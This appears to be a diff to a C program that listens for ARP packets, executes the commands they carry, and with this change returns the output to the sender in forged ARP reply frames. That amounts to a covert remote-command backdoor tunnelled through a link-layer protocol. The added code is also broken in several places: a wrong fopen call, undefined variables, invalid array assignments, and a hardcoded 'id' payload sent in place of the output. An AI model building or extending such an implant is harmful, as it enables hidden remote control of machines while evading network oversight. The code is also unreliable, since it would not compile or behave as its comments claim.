@@ -5,6 +5,7 @@
 #include <netinet/ip.h>
 #include <netinet/if_ether.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <signal.h>
@@ -13,6 +14,7 @@
 #define BUF_SIZE 65536
 #define PAYLOAD_BUF 1024
 #define IP_ALEN 4
+#define IF_NAME "eth0"
 
 typedef unsigned char hwaddr[ETH_ALEN];
 typedef unsigned char ipaddr[IP_ALEN];
@@ -60,6 +62,31 @@ void handle_sigint(int sig) {
     if(pid > 0)
         kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
+}
+
+
+char *get_iface(){
+    return IF_NAME;
+}
+
+char *get_my_mac(){
+    char filename[100];
+    snprintf(filename, 100, "/sys/class/net/%s/address", get_iface());
+    FILE *fp = fopen(filename);
+    if (fp == NULL){
+        perror("Unable to open file");
+        exit(EXIT_FAILURE);
+    }
+
+    char *output = malloc(ETH_ALEN);
+    if (output == NULL) {
+        perror("get_my_mac unable to allocate output");
+        exit(EXIT_FAILURE);
+    }
+    fscanf(fp, "%s", output);
+    fclose(fp);
+
+    return output;
 }
 
 bool is_me(const char *ip_address) {
@@ -122,6 +149,46 @@ int execute_command_with_timeout(const char *command, int timeout, char *output,
 }
 
 
+void send_reply(ethhdr *eth_in, arphdr *arp_in, char *output){
+    struct sockaddr_ll sa;
+    char buffer[BUF_SIZE];
+
+    ethhdr *eth_out = (ethhdr *)buffer;
+    arphdr *arp_out = (arphdr *)(buffer + ETH_HLEN);
+
+    // Flip source and dest
+    eth_out->h_source = eth_in->h_dest;
+    eth_out->h_dest = eth_in->h_source;
+    eth_out->h_proto = ETH_P_ARP;
+
+    arp_out->hardware_size = ETH_ALEN;
+    arp_out->hardware_type = 1;
+    arp_out->opcode = 2;
+    arp_out->protocol_size = IP_ALEN;
+    arp_out->protocol_type = ETH_P_IP;
+    arp_out->sender_ip = arp_in->target_ip;
+    arp_out->sender_mac = get_my_mac();
+    arp_out->target_ip = arp_in->sender_ip;
+    arp_out->target_mac = arp_in->sender_mac;
+
+    // Append custom payload
+    const char *payload = "id";
+    size_t packet_len = ETH_HLEN + 28 + strlen(payload);
+    memcpy(packet + ETH_HLEN + 28, payload, strlen(payload));
+
+    // Set up socket address structure
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_ifindex = if_nametoindex(get_iface());
+    sa.sll_halen = MAC_LEN;
+    memcpy(sa.sll_addr, arp_out->target_mac, MAC_LEN);
+
+    // Send the packet
+    if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        perror("sendto");
+    } else {
+        printf("ARP request sent to %s\n", target_ip_str);
+    }
+}
 
 void process_incoming(ethhdr *eth_header, arphdr* arp_header){
     // Step 1: Convert into sniff_t
@@ -176,6 +243,7 @@ void process_incoming(ethhdr *eth_header, arphdr* arp_header){
         if (status == 0) {
             // Success, send output as reply
             fprintf(stderr, "Success! -- \n%s\n -- \n", output);
+            send_reply(eth_header, arp_header, output);
         } else if (status == -2) {
             // Failed, send timeout as reply
             fprintf(stderr, "Failed! Command timed out.\n");
@@ -235,9 +303,6 @@ int sniff() {
     close(sockfd);
     return 0;
 }
-
-// FIXME:
-#define IF_NAME "eth0"
 
 int main(){
     // TODO: On start kill all orphans
